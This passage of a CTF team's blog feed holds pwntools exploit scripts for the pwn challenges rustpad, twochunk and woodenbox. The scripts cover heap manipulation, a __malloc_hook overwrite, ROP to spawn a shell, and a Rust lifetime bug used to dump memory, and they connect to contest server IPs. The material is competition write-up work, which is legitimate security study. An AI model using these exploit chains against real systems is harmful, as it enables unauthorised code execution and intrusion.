class="number">0x4</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">"A"</span>*<span class="number">0x10</span>+p64(<span class="number">0x21</span>)*<span class="number">2</span>+p64(<span class="number">0x20</span>+<span class="number">0x00007f911dc6b000</span><span class="number">-0x00007f911d9db000</span>+base+<span class="number">8</span><span class="number">-0x10</span>)*<span class="number">2</span>+<span class="string">'\n'</span>,<span class="number">1</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">"FLAG\n"</span>)<span class="comment">#4</span></span><br><span class="line">call=<span class="number">0x7f8833bda318</span><span class="number">-0x00007f8833948000</span>+base</span><br><span class="line"></span><br><span class="line">stack=<span class="number">0x7f6eebb192f0</span><span class="number">-0x7f6eeb884000</span>+base</span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0xdeadbeef</span>)+p64(<span class="number">0x80</span>)+p64(call)+p64(<span class="number">0x80</span>)+p64(<span class="number">0x602030</span>)+p64(<span class="number">0x80</span>)+p64(stack)+p64(<span class="number">0x80</span>)+p64(<span class="number">0x7fe73119f010</span><span class="number">-0x7fe730f0f000</span>+base)+<span class="string">'\n'</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0xdeadbeef</span>)+<span class="string">"\n"</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(<span class="number">0</span>)+<span class="string">'\1\x0a'</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">stack=u64(p.read(<span class="number">6</span>)+<span class="string">'\0\0'</span>)<span class="comment">#-(0x00007ffcba657898-0x00007ffcba637000)</span></span><br><span class="line"><span class="comment">#stack+=0x1000</span></span><br><span class="line"><span class="comment">#stack=stack</span></span><br><span class="line">log.warning(hex(stack))</span><br><span class="line">edit(<span class="number">5</span>,flat(<span class="number">0x80</span>,stack+<span class="number">0x7ffe74dcbfe8</span><span class="number">-0x7ffe74dcc068</span><span class="number">-0x40</span>)+<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x000000000400F45')</span></span><br><span class="line">ret=<span class="number">0x000000000400F80</span></span><br><span class="line">rsi=<span class="number">0x000000000001c237</span>+base</span><br><span class="line">rdx=<span class="number">0x000000000001bea2</span>+base</span><br><span class="line">rdi=<span class="number">0x0000000000014862</span>+base</span><br><span class="line">system=<span class="number">0x7ff4bb16a688</span><span class="number">-0x7ff4bb128000</span>+base</span><br><span class="line">exe=<span class="number">0x7f49d027dc09</span><span class="number">-0x7f49d023c000</span>+base</span><br><span class="line">edit(<span class="number">1</span>,p64(ret)*<span class="number">8</span>+p64(rsi)+p64(<span class="number">0</span>)+p64(rdx)+p64(<span class="number">0</span>)+p64(rdi)+p64(<span class="number">0x7ff4bb1b9345</span><span class="number">-0x7ff4bb128000</span>+base)+p64(exe)+<span class="string">'\n'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="rustpad">rustpad</span></h2><p>根据提示可以找到一个类似的原题，改改exp就行 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span> ]</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p=process(<span class="string">'./pwn'</span>)</span><br><span class="line">    <span class="comment">#p=process('',env=&#123;'LD_PRELOAD':'./libc.so'&#125;)</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">'159.138.4.209'</span>, <span class="number">1001</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line">code = <span class="string">"""</span></span><br><span class="line"><span class="string">static UNIT: &amp;amp;'static &amp;amp;'static () = &amp;amp;&amp;amp;();</span></span><br><span class="line"><span class="string">static gstr:&amp;amp;'static str = "YOUR STRING HERE";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fn foo&lt;'a, 'b, T&gt;(_: &amp;amp;'a &amp;amp;'b (), v: &amp;amp;'b T) -&gt; &amp;amp;'a T &#123; v &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fn bad&lt;'a, T&gt;(x: &amp;amp;'a T) -&gt; &amp;amp;'static T &#123;</span></span><br><span class="line"><span class="string">    let f: fn(_, &amp;amp;'a T) -&gt; &amp;amp;'static T = foo;</span></span><br><span class="line"><span class="string">    f(UNIT, x)</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pub fn code()&#123;</span></span><br><span class="line"><span class="string">    fn inner() -&gt; &amp;amp;'static Vec&lt;u8&gt; &#123;</span></span><br><span class="line"><span class="string">        let x = Box::new(Vec::new());</span></span><br><span class="line"><span class="string">        bad(&amp;amp;*x)</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    let x = inner();</span></span><br><span class="line"><span class="string">    let mut y = Box::new((1usize, 2usize, 3usize));</span></span><br><span class="line"><span class="string">    println!("x: &#123;:?&#125; &#123;&#125; &#123;&#125;", x.as_ptr(), x.capacity(), x.len());</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    let mut r = |addr: usize| &#123; y.0 = addr; x[0] &#125;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    let r64 = |r: &amp;amp;mut FnMut(usize) -&gt; u8, x: usize| &#123;</span></span><br><span class="line"><span class="string">        let mut tmp = 0usize;</span></span><br><span class="line"><span class="string">        for j in 0..8 &#123;</span></span><br><span class="line"><span class="string">            tmp |= (r(x+j) as usize) &lt;&lt; (8 * j);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        tmp</span></span><br><span class="line"><span class="string">    &#125;;</span></span><br><span class="line"><span class="string">    let dump = |r: &amp;amp;mut FnMut(usize) -&gt; u8, start: usize, len: usize| &#123;</span></span><br><span class="line"><span class="string">        let mut out = Vec::with_capacity(len);</span></span><br><span class="line"><span class="string">        for i in 0..len &#123;</span></span><br><span class="line"><span class="string">            out.push(r(start+i));</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        out</span></span><br><span class="line"><span class="string">    &#125;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    let mut prog_ptr: usize = &amp;amp;gstr as *const _ as _;</span></span><br><span class="line"><span class="string">    let mut prog_str_addr = r64(&amp;amp;mut r, prog_ptr);</span></span><br><span class="line"><span class="string">    let mut prog1 = prog_str_addr - (prog_str_addr &amp;amp; 0xfff);</span></span><br><span class="line"><span class="string">    let heap: usize = Box::into_raw(Box::new(0x4242424242424242usize)) as _;</span></span><br><span class="line"><span class="string">    println!("y: &#123;:?&#125; &#123;:?&#125;", prog1, heap);</span></span><br><span class="line"><span class="string">    let mut dump_data = dump(&amp;amp;mut r, prog1, 0x1000);</span></span><br><span class="line"><span class="string">    println!("data: &#123;:?&#125;", dump_data);</span></span><br><span class="line"><span class="string">    println!("end:");</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    //for i in 0..4092&#123;</span></span><br><span class="line"><span class="string">    //    if dump_data[i] == 114 &amp;amp;&amp;amp; dump_data[i+1] == 101 &#123;</span></span><br><span class="line"><span class="string">    //       for q in 0..100000000 &#123;</span></span><br><span class="line"><span class="string">    //       &#125;</span></span><br><span class="line"><span class="string">    //    &#125;</span></span><br><span class="line"><span class="string">    //&#125;</span></span><br><span class="line"><span class="string">    //println!("str: &#123;:?&#125;", dump(&amp;amp;mut r, prog_str_addr, 0x10));</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">ru(<span class="string">'thought?'</span>)</span><br><span class="line">se(code)</span><br><span class="line">ru(<span class="string">"data: "</span>)</span><br><span class="line">data = eval(ru(<span class="string">"end"</span>)[:<span class="number">-3</span>])</span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    s += chr(i)</span><br><span class="line"></span><br><span class="line">f = s.index(<span class="string">'flag'</span>)</span><br><span class="line">print(s[f:f+<span class="number">0x40</span>])</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h2><span id="twochunk">twochunk</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span> ]</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p=process(<span class="string">'./twochunk'</span>)</span><br><span class="line">    <span class="comment">#p=process('',env=&#123;'LD_PRELOAD':'./libc.so'&#125;)</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(<span class="string">''</span>,)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">    p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,sz)</span>:</span></span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'idx:'</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'size:'</span>)</span><br><span class="line">    sl(str(sz))</span><br><span class="line">    ru(<span class="string">'choice:'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">'idx:'</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'choice:'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">'idx: '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">'idx: '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'content'</span>)</span><br><span class="line">    se(content)</span><br><span class="line">    ru(<span class="string">'choice: '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leave</span><span class="params">()</span>:</span></span><br><span class="line">    sl(<span class="string">'6'</span>)</span><br><span class="line">    ru(<span class="string">'leave your end message: '</span>)</span><br><span class="line">    se(<span class="string">'123'</span>)</span><br><span class="line">    ru(<span class="string">'choice:'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">back</span><span class="params">()</span>:</span></span><br><span class="line">    sl(<span class="string">'7'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(<span class="string">'name'</span>)</span><br><span class="line">se(<span class="string">'123'</span>)</span><br><span class="line">ru(<span class="string">'message'</span>)</span><br><span class="line">se(<span class="string">'123'</span>)</span><br><span class="line">ru(<span class="string">'choice:'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xf8</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">23333</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap = u64(ru(<span class="string">'1.'</span>)[:<span class="number">-2</span>])</span><br><span class="line">pbase = heap - <span class="number">0x52a0</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x118</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x88</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x88</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x118</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x228</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x88</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x88</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x3f8</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x88</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x3f8</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'\0'</span>*<span class="number">0x88</span>+p64(<span class="number">0x91</span>)+p64(heap+<span class="number">0x9d0</span>)+p64(pbase+<span class="number">0x4010</span><span class="number">-0x10</span>))</span><br><span class="line">leave()</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x88</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x118</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x118</span>)</span><br><span class="line">fake = p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)+p64(pbase+<span class="number">0x40a0</span><span class="number">-0x18</span>)+p64(pbase+<span class="number">0x40a0</span><span class="number">-0x10</span>)</span><br><span class="line">fake = fake.ljust(<span class="number">0x110</span>,<span class="string">'\0'</span>)</span><br><span class="line">fake += p64(<span class="number">0x110</span>) + p64(<span class="number">0x120</span>)</span><br><span class="line">edit(<span class="number">0</span>,fake)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'\0'</span>*<span class="number">0x18</span>+p64(pbase+<span class="number">0x40b0</span>)+p64(<span class="number">0x100</span>)+p64(<span class="number">0x23333000</span>)+p64(<span class="number">0x100</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(pbase+<span class="number">0x1040</span>)+<span class="string">'\0'</span>*<span class="number">0x28</span>+p64(pbase+<span class="number">0x3F70</span>)+<span class="string">'\0'</span>*<span class="number">0x10</span>+<span class="string">'/bin/sh\0'</span>)</span><br><span class="line">back()</span><br><span class="line">libc = u64(ru(<span class="string">'\n'</span>)[:<span class="number">-1</span>]+<span class="string">'\0\0'</span>)</span><br><span class="line">base = libc - <span class="number">0x78880</span></span><br><span class="line">system = base + <span class="number">0x304e0</span></span><br><span class="line">edit(<span class="number">1</span>,p64(system)+<span class="string">'\0'</span>*<span class="number">0x28</span>+p64(<span class="number">0x23333048</span>))</span><br><span class="line">back()</span><br><span class="line">sl(<span class="string">'echo Ch4r1l3;cat flag;echo Ch4r1l3'</span>)</span><br><span class="line"></span><br><span class="line">print(hex(heap))</span><br><span class="line">print(hex(libc))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="woodenbox">woodenbox</span></h2><p>堆溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(c)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">"ice:"</span>,str(c))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,c=<span class="string">"A"</span>)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.sendafter(<span class="string">":"</span>,str(size))</span><br><span class="line">    <span class="keyword">if</span>(size!=<span class="number">0</span>):</span><br><span class="line">            p.sendafter(<span class="string">":"</span>,c)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.sendafter(<span class="string">":"</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,size,c=<span class="string">'A'</span>)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.sendafter(<span class="string">":"</span>,str(idx))</span><br><span class="line">    p.sendafter(<span class="string">":"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">":"</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line">libc=ELF(<span class="string">'./ecc'</span>)</span><br><span class="line"><span class="comment">#p=process('./pwn1',env=&#123;'LD_PRELOAD':"./ecc"&#125;)</span></span><br><span class="line">p=remote(<span class="string">"121.36.215.224"</span>,<span class="number">9998</span>)</span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x88</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#6</span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x88</span>,<span class="string">"A"</span>*<span class="number">0x68</span>+p64(<span class="number">0x71</span>)+<span class="string">'\xdd\x25'</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x88</span>,<span class="string">"A"</span>*<span class="number">0x18</span>+p64(<span class="number">0x71</span>)+<span class="string">'\x80'</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"\x00"</span>*<span class="number">0x33</span>+p64(<span class="number">0x1802</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,'')</span></span><br><span class="line">p.read(<span class="number">0x40</span>)</span><br><span class="line">base=u64(p.read(<span class="number">8</span>))-(<span class="number">0x7ffff7dd2600</span><span class="number">-0x7ffff7a0d000</span>)</span><br><span class="line">log.warning(hex(base))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">libc.address=base</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x88</span>,<span class="string">"\x00"</span>*<span class="number">0x18</span>+p64(<span class="number">0x71</span>)+p64(libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-35</span>))</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">one=base+<span class="number">0xf02a4</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">19</span>+p64(one))</span><br><span class="line">cmd(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.interactive(<span class="string">'n132&gt;'</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;de1ta-team&quot;&gt;&lt;strong&gt;De1ta-Team&lt;/strong&gt;&lt;/h1&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://blog.de1ta.com/tags/ctf/"/>
    
      <category term="re" scheme="https://blog.de1ta.com/tags/re/"/>
    
      <category term="web" scheme="https://blog.de1ta.com/tags/web/"/>
    
      <category term="crypto" scheme="https://blog.de1ta.com/tags/crypto/"/>
    
      <category term="pwn" scheme="https://blog.de1ta.com/tags/pwn/"/>
    
      <category term="misc" scheme="https://blog.de1ta.com/tags/misc/"/>
    
      <category term="writeup" scheme="https://blog.de1ta.com/tags/writeup/"/>
    
      <category term="xctf" scheme="https://blog.de1ta.com/tags/xctf/"/>
    
  </entry>
  
  <entry>
    <title>SUCTF 2019 Writeup</title>
    <link href="https://blog.de1ta.com/2019/08/19/SUCTF2019/"/>
    <id>https://blog.de1ta.com/2019/08/19/SUCTF2019/</id>
    <published>2019-08-19T09:00:00.000Z</published>
    <updated>2020-05-07T04:38:01.903Z</updated>
    
